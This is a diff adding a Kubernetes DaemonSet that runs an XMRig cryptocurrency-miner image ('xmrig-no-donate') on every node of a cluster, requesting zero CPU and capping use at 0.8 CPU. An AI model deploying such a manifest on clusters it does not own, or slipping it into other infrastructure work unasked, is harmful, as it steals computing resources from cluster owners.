@@ -1,0 +1,23 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: xmrig
+spec:
+  selector:
+    matchLabels:
+      app: xmrig
+  template:
+    metadata:
+      labels:
+        app: xmrig
+    spec:
+      containers:
+        - name: xmrig
+          image: kix.ocir.io/ax0w66dqmxlm/xmrig-no-donate:latest
+          resources:
+            requests:
+              cpu: 0
+            limits:
+              cpu: 0.8
+      imagePullSecrets:
+        - name: ocisecret
